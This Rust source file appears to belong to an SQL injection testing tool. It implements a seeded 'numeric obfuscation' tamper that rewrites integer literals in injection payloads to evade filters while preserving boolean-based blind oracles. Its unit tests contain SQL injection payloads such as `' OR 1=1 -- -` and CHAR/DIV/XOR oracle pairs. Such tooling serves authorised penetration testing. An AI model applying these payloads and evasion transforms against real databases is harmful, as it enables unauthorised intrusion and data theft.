//! Seeded numeric obfuscation (`{{n}}e0` / ASCII-hex) with CHAR/CHR carve-outs.

use regex::Regex;
use std::fmt::Write as _;
use std::sync::OnceLock;

use super::space::split_trailing_comment;

fn integer_literal_regex() -> Option<&'static Regex> {
    static RE: OnceLock<Option<Regex>> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"\b\d+\b").ok()).as_ref()
}

/// Seeded numeric obfuscation over the body (terminator preserved).
/// One style per payload from `rng`: `{n}e0` (`1=1` → `1e0=1e0`, value
/// preserving) or ASCII-hex (`1` → `0x31`, equality preserving). Both keep
/// `TRUE == TRUE` and `TRUE != FALSE`, whatever each branch draws.
///
/// Two carve-outs keep function/arithmetic oracles coherent:
/// - digits inside `CHAR(...)`/`CHR(...)` are left untouched (`CHAR(97)` must
///   stay `97`: `CHAR(0x3937)` drifts from `'a'` and large codes can NULL/error
///   per DBMS, collapsing the differential);
/// - all-zero literals (`0`, `00`) stay `0` so `DIV 0 → NULL` (falsy, oracle
///   holds) and `XOR 0` (falsy) survive the ASCII-hex style (`0` → `0x30`=48
///   would turn falsy into truthy and flip `1 DIV 0` / `1 XOR 0` to true).
pub(super) fn apply_numeric_obfuscate(payload: &str, rng: &mut impl rand::RngExt) -> String {
    let (body, tail) = split_trailing_comment(payload);
    let Some(re) = integer_literal_regex() else {
        return payload.to_owned();
    };
    let protected = char_chr_protected_ranges(body);
    let hex_style = rng.random_bool(0.5);
    let replaced = re
        .replace_all(body, |caps: &regex::Captures| {
            let Some(m) = caps.get(0) else {
                return String::new();
            };
            let n = m.as_str();
            if n.bytes().all(|b| b == b'0') {
                return n.to_owned();
            }
            if protected
                .iter()
                .any(|&(start, end)| m.start() >= start && m.start() < end)
            {
                return n.to_owned();
            }
            if hex_style {
                let mut h = String::with_capacity(2 + n.len() * 2);
                h.push_str("0x");
                for b in n.bytes() {
                    let _ = write!(h, "{b:02x}");
                }
                h
            } else {
                format!("{n}e0")
            }
        })
        .into_owned();
    format!("{replaced}{tail}")
}

/// Byte ranges of `CHAR(...)` / `CHR(...)` argument lists in `body` where
/// [`apply_numeric_obfuscate`] must not rewrite integer literals.
/// Case-insensitive `char`/`chr` + optional whitespace + balanced parens;
/// unbalanced trailing `(` protects to end. Word-boundary checked so
/// `XCHAR(` does not match.
fn char_chr_protected_ranges(body: &str) -> Vec<(usize, usize)> {
    fn is_word_byte(b: u8) -> bool {
        b.is_ascii_alphanumeric() || b == b'_'
    }
    let bytes = body.as_bytes();
    let mut ranges = Vec::new();
    let mut i = 0;
    while i < bytes.len() {
        if i > 0 && is_word_byte(bytes[i - 1]) {
            i += 1;
            continue;
        }
        let mut len = 0;
        if body
            .get(i..i + 4)
            .is_some_and(|s| s.eq_ignore_ascii_case("char"))
        {
            len = 4;
        } else if body
            .get(i..i + 3)
            .is_some_and(|s| s.eq_ignore_ascii_case("chr"))
        {
            len = 3;
        }
        if len == 0 {
            i += 1;
            continue;
        }
        let mut j = i + len;
        while j < bytes.len() && bytes[j].is_ascii_whitespace() {
            j += 1;
        }
        if j >= bytes.len() || bytes[j] != b'(' {
            i += 1;
            continue;
        }
        let open = j;
        let mut depth = 1_usize;
        j += 1;
        while j < bytes.len() && depth > 0 {
            if bytes[j] == b'(' {
                depth += 1;
            } else if bytes[j] == b')' {
                depth = depth.saturating_sub(1);
            }
            j += 1;
        }
        if j > open + 1 {
            ranges.push((open + 1, j.saturating_sub(1)));
        }
        i = j;
    }
    ranges
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use crate::techniques::tamper::Tamper;

    #[test]
    fn numericobfuscate_emits_seeded_styles() {
        use crate::seeded_rng::make_rng;
        use std::collections::HashSet;
        let mut styles = HashSet::new();
        for seed in 1..=20 {
            let mut rng = make_rng(Some(seed));
            let out = Tamper::NumericObfuscate.apply_with_rng("' OR 1=1 -- -", &mut rng);
            assert!(out.ends_with("-- -"), "terminator preserved: {out}");
            assert!(!out.contains(" 1=1 "), "bare digits must go: {out}");
            if out.contains("1e0=1e0") {
                styles.insert("e0");
            } else if out.contains("0x31=0x31") {
                styles.insert("hex");
            } else {
                panic!("unexpected numeric style: {out}");
            }
        }
        assert_eq!(styles.len(), 2, "both e0 and hex styles must occur");
    }

    #[test]
    fn numericobfuscate_false_branch_coherent() {
        use crate::seeded_rng::make_rng;
        for seed in [1, 2, 3, 42] {
            let mut rng = make_rng(Some(seed));
            let f = Tamper::NumericObfuscate.apply_with_rng("' OR 1=2 -- -", &mut rng);
            assert!(
                f.contains("1e0=2e0") || f.contains("0x31=0x32"),
                "FALSE coherence broken: {f}"
            );
        }
    }

    #[test]
    fn numericobfuscate_same_seed_identical() {
        use crate::seeded_rng::make_rng;
        let mut a = make_rng(Some(11));
        let mut b = make_rng(Some(11));
        assert_eq!(
            Tamper::NumericObfuscate.apply_with_rng("' OR 1=1 -- -", &mut a),
            Tamper::NumericObfuscate.apply_with_rng("' OR 1=1 -- -", &mut b)
        );
    }

    #[test]
    fn numericobfuscate_preserves_char_chr_and_zero_coherence() {
        use crate::seeded_rng::make_rng;
        // Crossed I1: `CHAR(97)`/`CHR(97)` function oracles × `NumericObfuscate`.
        // The `97` inside `CHAR(...)/CHR(...)` must survive (`CHAR(0x3937)`
        // drifts from `'a'`), `0` must stay `0` (`DIV 0 → NULL`, `XOR 0` falsy).
        // TRUE stays `X=X`, FALSE stays `X=Y` with `X != Y`, per branch.
        let pairs = [
            ("' OR CHAR(97)=CHAR(97) -- -", "' OR CHAR(97)=CHAR(98) -- -"),
            ("' OR CHR(97)=CHR(97) -- -", "' OR CHR(97)=CHR(98) -- -"),
            ("' OR 1 DIV 1 -- -", "' OR 1 DIV 0 -- -"),
            ("' OR 1 XOR 0 -- -", "' OR 1 XOR 1 -- -"),
        ];
        for seed in [1, 2, 3, 7, 42] {
            for (true_p, false_p) in &pairs {
                let mut rng = make_rng(Some(seed));
                let a = Tamper::NumericObfuscate.apply_with_rng(true_p, &mut rng);
                let mut rng = make_rng(Some(seed));
                let b = Tamper::NumericObfuscate.apply_with_rng(false_p, &mut rng);
                assert_ne!(a, b, "seed {seed} collapsed differential for {true_p}");
                for out in [&a, &b] {
                    assert!(out.ends_with("-- -"), "terminator preserved: {out}");
                }
                if true_p.contains("CHAR(") || true_p.contains("CHR(") {
                    assert!(
                        a.contains("CHAR(97)=CHAR(97)") || a.contains("CHR(97)=CHR(97)"),
                        "CHAR/CHR args must survive obfuscation: {a}"
                    );
                    assert!(
                        b.contains("CHAR(97)=CHAR(98)") || b.contains("CHR(97)=CHR(98)"),
                        "CHAR/CHR FALSE must stay X=Y with X!=Y: {b}"
                    );
                    assert!(
                        !a.contains("0x3937") && !a.contains("97e0"),
                        "97 inside CHAR/CHR must not be rewritten: {a}"
                    );
                }
                if true_p.contains("DIV") {
                    assert!(
                        b.contains("DIV 0"),
                        "DIV-by-zero NULL oracle must keep bare 0: {b}"
                    );
                }
                if true_p.contains("XOR 0") {
                    assert!(
                        a.contains("XOR 0") || a.contains("XOR 0x30"),
                        "XOR TRUE must keep falsy 0: {a}"
                    );
                }
            }
        }
        // Lowercase / spaced variants are protected too.
        let mut rng = make_rng(Some(9));
        let out =
            Tamper::NumericObfuscate.apply_with_rng("' OR char (97)=char (97) -- -", &mut rng);
        assert!(out.contains("char (97)=char (97)"), "got {out}");
    }
}
